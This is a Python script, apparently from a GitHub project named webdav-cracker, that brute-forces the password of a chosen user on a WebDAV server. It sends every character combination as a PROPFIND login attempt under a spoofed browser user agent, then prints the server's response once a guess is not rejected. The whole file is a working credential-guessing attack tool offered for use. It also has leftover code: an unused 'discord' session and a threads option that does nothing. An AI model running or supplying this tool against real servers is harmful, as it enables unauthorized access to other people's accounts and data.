##################################################################
#                                                                #
#                         webdav-cracker                         #
#                                                                #
#                Copyright (C) 2022 X Gamer Guide                #
#         https://github.com/X-Gamer-Guide/webdav-cracker        #
#                                                                #
#               don't learn to hack, hack to learn               #
#                                                                #
##################################################################


import argparse
import base64
import itertools
import string
import threading

import requests


parser = argparse.ArgumentParser(
    description="A tool to get access to a WEBDAV server"
)


parser.add_argument(
    "url",
    type=str,
    help="The DAV URL of the target"
)

parser.add_argument(
    "username",
    type=str,
    help="Username to attack",
    default="admin"
)

parser.add_argument(
    "--user_agent",
    type=str,
    help="User agent for the requests",
    default="Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0"
)

parser.add_argument(
    "--threads",
    type=int,
    help="The number of threads used",
    default=1
)

parser.add_argument(
    "--b64_letters",
    type=str,
    help="The letters used to attack (base64 encoded)",
    default=base64.b64encode(
        (
            string.ascii_letters + string.digits + string.punctuation
        ).encode()
    ).decode()
)


args = parser.parse_args()


discord = requests.session()

dav = requests.session()
dav.headers = {
    "User-Agent": args.user_agent
}


def brute_force() -> requests.Response:
    i = 0
    while True:
        i += 1

        for j in map(
            "".join,
            itertools.product(
                base64.b64decode(
                    args.b64_letters
                ).decode(),
                repeat=i + 1
            )
        ):

            print(j)

            r = dav.request(
                "PROPFIND",
                args.url,
                headers={
                    "Depth": "1"
                },
                auth=(
                    args.username,
                    j
                )
            )

            if r.status_code != 401:
                return r


r = brute_force()

print("-" * 80)

print(r.text)

print("-" * 80)

print(r.status_code)

print("-" * 80)

print(r.headers)
